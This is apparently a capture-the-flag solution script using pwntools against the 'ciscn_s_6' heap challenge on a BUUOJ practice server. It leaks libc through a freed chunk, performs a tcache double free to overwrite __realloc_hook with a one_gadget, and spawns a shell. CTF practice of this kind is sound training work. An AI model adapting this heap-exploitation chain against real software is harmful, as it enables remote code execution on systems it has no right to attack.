from pwn import *

context(os = 'linux', arch = 'amd64', log_level = 'debug')
# io = process('ciscn_s_6')
io = remote('node4.buuoj.cn', 29927)
# libc = ELF('/home/payoung/Downloads/glibc-all-in-one/libs/2.27-3ubuntu1_amd64/libc-2.27.so')
libc = ELF('libc-2.27.so')
elf = ELF('ciscn_s_6')


def add(size, name, call):
    io.sendlineafter('choice:', '1')
    io.sendlineafter('Please input the size of compary\'s name\n', str(size))
    io.sendlineafter('please input name:\n', name)
    io.sendlineafter('please input compary call:\n', call)


def show(index):
    io.sendlineafter('choice:', '2')
    io.sendlineafter('Please input the index:\n', str(index))
    io.recvuntil('name:\n')
    return io.recvuntil('\nphone:\n', drop=True)


def delete(index):
    io.sendlineafter('choice:', '3')
    io.sendlineafter('Please input the index:\n', str(index))


def leak_libc():
    global libc_base
    add(0x410, 'a', '1')
    add(0x20, 'a', '1')
    delete(0)
    libc_base = u64(show(0).ljust(8, b'\x00')) - libc.sym['__malloc_hook'] - 0x70
    log.success('libc_base: ' + hex(libc_base))


def pwn():
    __realloc_hook = libc_base + libc.sym['__realloc_hook']
    realloc = libc_base + libc.sym['realloc']
    one_gadget = libc_base + 0x10a38c
    delete(1)
    delete(1)
    add(0x20, p64(__realloc_hook), '1')
    add(0x20, 'a', '1')
    add(0x20, p64(one_gadget) + p64(realloc + 14), '1')
    # gdb.attach(io)
    # pause()
    io.sendlineafter('choice:', '1')
    io.interactive()


if __name__ == '__main__':
    leak_libc()
    pwn()
